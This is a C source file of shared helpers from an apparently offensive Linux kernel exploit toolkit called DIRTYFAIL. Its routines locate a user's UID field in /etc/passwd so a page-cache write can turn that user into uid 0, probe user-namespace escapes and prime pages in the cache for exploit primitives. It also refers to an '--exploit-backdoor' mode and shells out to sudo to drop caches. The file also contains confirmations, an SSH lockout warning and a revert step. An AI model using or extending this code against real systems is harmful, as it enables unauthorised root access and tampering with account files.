/*
 * DIRTYFAIL — common.c
 *
 * Tiny utility surface shared by the detectors and exploiters. Nothing
 * here is CVE-specific — that lives in copyfail.c, dirtyfrag_esp.c and
 * dirtyfrag_rxrpc.c.
 */

#include "common.h"

#include <ctype.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <pwd.h>
#ifdef __linux__
#include <sys/syscall.h>
#endif

/* On glibc <sched.h>+_GNU_SOURCE provides these. macOS lacks them; we
 * still want this file to parse under macOS clang for static analysis,
 * so the unprivileged_userns_allowed body itself is platform-guarded. */
#ifndef CLONE_NEWUSER
#define CLONE_NEWUSER 0x10000000
#endif

bool dirtyfail_use_color    = true;
bool dirtyfail_active_probes = false;
bool dirtyfail_no_revert    = false;
bool dirtyfail_json         = false;

static void vlog(FILE *out, const char *prefix, const char *color,
                 const char *fmt, va_list ap)
{
    if (dirtyfail_use_color && color)
        fprintf(out, "\033[%sm%s\033[0m ", color, prefix);
    else
        fprintf(out, "%s ", prefix);
    vfprintf(out, fmt, ap);
    fputc('\n', out);
    /* Flush — when stdout is piped (e.g. through ssh, timeout, tee)
     * the default fully-buffered mode hides log lines until either the
     * process exits cleanly or 4 KiB accumulates. We log to follow
     * progress; visibility wins over throughput here. */
    fflush(out);
}

/* In --json mode, all log output goes to stderr so stdout stays a
 * clean JSON document for downstream parsers. Outside --json mode,
 * we keep the original split (info/progress to stdout, errors to
 * stderr) for human readability. */
#define LOG_FN(name, prefix, color, default_stream)                         \
    void name(const char *fmt, ...) {                                       \
        FILE *_s = dirtyfail_json ? stderr : (default_stream);              \
        va_list ap; va_start(ap, fmt);                                      \
        vlog(_s, prefix, color, fmt, ap);                                   \
        va_end(ap);                                                         \
    }

LOG_FN(log_step, "[*]", "1;36", stdout)   /* cyan  */
LOG_FN(log_ok,   "[+]", "1;32", stdout)   /* green */
LOG_FN(log_bad,  "[-]", "1;31", stderr)   /* red   */
LOG_FN(log_warn, "[!]", "1;33", stderr)   /* yellow*/
LOG_FN(log_hint, "[i]", "0;37", stdout)   /* dim   */

/* ------------------------------------------------------------------ */

bool kernel_version(int *major, int *minor)
{
    struct utsname u;
    if (uname(&u) != 0) return false;
    /* release looks like "6.12.0-124.49.1.el10_1.x86_64" — split on dots. */
    char *dot1 = strchr(u.release, '.');
    if (!dot1) return false;
    *dot1 = '\0';
    *major = atoi(u.release);
    char *dot2 = strchr(dot1 + 1, '.');
    if (dot2) *dot2 = '\0';
    *minor = atoi(dot1 + 1);
    return true;
}

bool kmod_loaded(const char *name)
{
    FILE *f = fopen("/proc/modules", "r");
    if (!f) return false;
    char line[512];
    size_t nlen = strlen(name);
    bool found = false;
    while (fgets(line, sizeof(line), f)) {
        if (strncmp(line, name, nlen) == 0 && line[nlen] == ' ') {
            found = true;
            break;
        }
    }
    fclose(f);
    return found;
}

/* Probe by spawning a child. Doing it inline would either succeed (and
 * leave us in a fresh userns for the rest of the run, breaking later
 * checks) or fail and leave errno polluted. The fork is cheap enough.
 *
 * We use syscall(SYS_unshare) rather than the libc wrapper so this
 * compiles on toolchains where <sched.h> doesn't expose unshare(). */
bool unprivileged_userns_allowed(void)
{
#ifdef __linux__
    pid_t pid = fork();
    if (pid < 0) return false;
    if (pid == 0) {
        if (syscall(SYS_unshare, CLONE_NEWUSER) == 0) _exit(0);
        _exit(1);
    }
    int wstatus = 0;
    waitpid(pid, &wstatus, 0);
    return WIFEXITED(wstatus) && WEXITSTATUS(wstatus) == 0;
#else
    return false;  /* macOS analysis path — never executed in production */
#endif
}

bool find_passwd_uid_field(const char *username,
                           off_t *uid_off, size_t *uid_len,
                           char *uid_str)
{
    int fd = open("/etc/passwd", O_RDONLY);
    if (fd < 0) return false;

    struct stat st;
    if (fstat(fd, &st) < 0) { close(fd); return false; }

    char *buf = malloc(st.st_size + 1);
    if (!buf) { close(fd); return false; }
    ssize_t got = read(fd, buf, st.st_size);
    close(fd);
    if (got <= 0) { free(buf); return false; }
    buf[got] = '\0';

    bool found = false;
    size_t ulen = strlen(username);
    char *line = buf;
    while (line < buf + got) {
        if (strncmp(line, username, ulen) == 0 && line[ulen] == ':') {
            /* user:x:UID:GID:... — skip 2 colons to land on UID start. */
            char *p = line + ulen + 1;
            char *colon = strchr(p, ':');
            if (!colon) break;
            char *uid_start = colon + 1;
            char *uid_end   = strchr(uid_start, ':');
            if (!uid_end) break;
            size_t len = uid_end - uid_start;
            if (len >= 16) break;
            *uid_off = uid_start - buf;
            *uid_len = len;
            memcpy(uid_str, uid_start, len);
            uid_str[len] = '\0';
            found = true;
            break;
        }
        char *nl = strchr(line, '\n');
        if (!nl) break;
        line = nl + 1;
    }
    free(buf);
    return found;
}

bool drop_caches(void)
{
    int fd = open("/proc/sys/vm/drop_caches", O_WRONLY);
    if (fd < 0) return false;
    ssize_t n = write(fd, "3\n", 2);
    close(fd);
    return n == 2;
}

void hex_dump(const unsigned char *buf, size_t len)
{
    for (size_t i = 0; i < len; i += 16) {
        printf("    %04zx  ", i);
        for (size_t j = 0; j < 16; j++) {
            if (i + j < len) printf("%02x ", buf[i + j]);
            else             printf("   ");
        }
        printf(" |");
        for (size_t j = 0; j < 16 && i + j < len; j++) {
            unsigned char c = buf[i + j];
            putchar(isprint(c) ? c : '.');
        }
        printf("|\n");
    }
}

/*
 * authenc keyblob layout (see crypto/authenc.c::crypto_authenc_setkey):
 *
 *   struct rtattr { __u16 rta_len; __u16 rta_type; }   = 4 bytes
 *   __be32 enckeylen                                   = 4 bytes
 *   authkey[authkeylen]
 *   enckey [enckeylen]
 *
 * rta_len in the rtattr counts the rtattr header *plus* the enckeylen
 * field, so it is always 8.
 */
size_t build_authenc_keyblob(unsigned char *out,
                             const unsigned char *authkey, size_t authkeylen,
                             const unsigned char *enckey,  size_t enckeylen)
{
    /* struct rtattr { u16 rta_len; u16 rta_type; } */
    out[0] = 8;     out[1] = 0;
    out[2] = CRYPTO_AUTHENC_KEYA_PARAM;
    out[3] = 0;
    /* __be32 enckeylen */
    out[4] = (enckeylen >> 24) & 0xff;
    out[5] = (enckeylen >> 16) & 0xff;
    out[6] = (enckeylen >>  8) & 0xff;
    out[7] = (enckeylen      ) & 0xff;
    memcpy(out + 8,                  authkey, authkeylen);
    memcpy(out + 8 + authkeylen,     enckey,  enckeylen);
    return 8 + authkeylen + enckeylen;
}

bool typed_confirm(const char *expected)
{
    char buf[128];
    printf("    Type \033[1;33m%s\033[0m and press enter to proceed: ", expected);
    fflush(stdout);
    if (!fgets(buf, sizeof(buf), stdin)) return false;
    /* strip trailing newline */
    size_t n = strlen(buf);
    while (n > 0 && (buf[n-1] == '\n' || buf[n-1] == '\r')) buf[--n] = '\0';
    return strcmp(buf, expected) == 0;
}

static uid_t read_outer_id(const char *path)
{
    int fd = open(path, O_RDONLY);
    if (fd < 0) return (uid_t)-1;
    char buf[256];
    ssize_t n = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (n <= 0) return (uid_t)-1;
    buf[n] = '\0';
    /* Format: "<inner> <outer> <count>". For init namespace, this is
     * "0 0 4294967295" — outer == 0 == real root. For our userns it's
     * "0 1000 1" — outer == 1000 == real uid. */
    int inner = -1, outer = -1, count = 0;
    if (sscanf(buf, "%d %d %d", &inner, &outer, &count) != 3 || inner != 0)
        return (uid_t)-1;
    return (uid_t)outer;
}

uid_t real_uid_for_target(void)
{
    uid_t outer = read_outer_id("/proc/self/uid_map");
    /* If we're root in the init namespace OR no userns — return getuid().
     * The init namespace map shows "0 0 4294967295" → outer=0; only
     * trust an outer != 0 (and != -1) as the bypass-userns case. */
    if (outer == (uid_t)-1) return getuid();
    if (outer == 0) return getuid();
    return outer;
}

gid_t real_gid_for_target(void)
{
    uid_t outer = read_outer_id("/proc/self/gid_map");
    if (outer == (uid_t)-1) return getgid();
    if (outer == 0) return getgid();
    return (gid_t)outer;
}

/* Best-effort eviction of /etc/passwd from the page cache. Used by
 * the --no-shell path to revert the page-cache modification after a
 * successful exploit + verify.
 *
 * The naive `posix_fadvise(POSIX_FADV_DONTNEED)` is unreliable here:
 * since Linux 6.3, fadvise requires write access to the file, and we
 * typically don't have write access to /etc/passwd from inside the
 * AA bypass userns (root in userns maps to overflow uid in init ns,
 * which doesn't own the file).
 *
 * So we try in order:
 *   1. posix_fadvise on a fresh O_RDONLY fd (best case)
 *   2. sudo drop_caches via the system shell — works if the user has
 *      passwordless sudo, which is common on test VMs but a
 *      reasonable assumption to fail closed on
 *
 * Returns true if the cache was definitely cleared, false otherwise.
 * Caller should treat false as "page cache may still be modified —
 * tell the user to reboot if their session breaks". */
bool try_revert_passwd_page_cache(void)
{
    bool ok = false;
#ifdef POSIX_FADV_DONTNEED
    int fd = open("/etc/passwd", O_RDONLY);
    if (fd >= 0) {
        if (posix_fadvise(fd, 0, 0, POSIX_FADV_DONTNEED) == 0) ok = true;
        close(fd);
    }
#endif

    /* Even if fadvise returned 0, modern kernels silently no-op when
     * we lack write access — verify by re-reading and comparing to
     * what's on disk via O_DIRECT. Too fiddly. Just always also try
     * drop_caches as belt+suspenders. */
    int rc = system("sudo -n /bin/sh -c 'echo 3 > /proc/sys/vm/drop_caches' "
                    ">/dev/null 2>&1");
    if (rc == 0) ok = true;
    return ok;
}

bool ssh_lockout_check(const char *target_user)
{
    const char *ssh_conn = getenv("SSH_CONNECTION");
    if (!ssh_conn || !*ssh_conn) return true;     /* not over SSH */

    const char *user = getenv("USER");
    if (!user) {
        struct passwd *pw = getpwuid(real_uid_for_target());
        user = pw ? pw->pw_name : "";
    }
    if (strcmp(user, target_user) != 0) return true;  /* different user */

    log_warn("=================================================================");
    log_warn(" SSH LOCKOUT WARNING");
    log_warn("=================================================================");
    log_warn(" You are running this exploit OVER SSH against your OWN account.");
    log_warn(" The page-cache write will mark '%s' as uid 0 in /etc/passwd.",
             target_user);
    log_warn(" Once that lands:");
    log_warn("   - sshd looks up '%s', sees uid 0", target_user);
    log_warn("   - StrictModes rejects ~/.ssh/authorized_keys (owner uid 1000");
    log_warn("     != logging-in uid 0) → publickey auth fails");
    log_warn("   - PAM password auth also fails (uid mismatch)");
    log_warn(" Recovery requires console access to drop_caches or reboot.");
    log_warn(" If this is what you want, type YES_BREAK_SSH below.");
    log_warn(" Otherwise consider --exploit-backdoor (targets a nologin line");
    log_warn(" instead of your account, doesn't break SSH).");
    log_warn("=================================================================");

    return typed_confirm("YES_BREAK_SSH");
}

int open_and_cache(const char *path)
{
    int fd = open(path, O_RDONLY);
    if (fd < 0) return -1;
    /* Force a read so the page is in the cache. The exploit primitives
     * all assume the target page is already populated. We don't care
     * what the bytes are or whether read returns short — only that the
     * kernel pulled the page into the cache as a side effect. */
    char tmp[4096];
    if (read(fd, tmp, sizeof(tmp)) < 0) {
        /* primer failed; caller's splice will surface a useful errno. */
    }
    lseek(fd, 0, SEEK_SET);
    return fd;
}
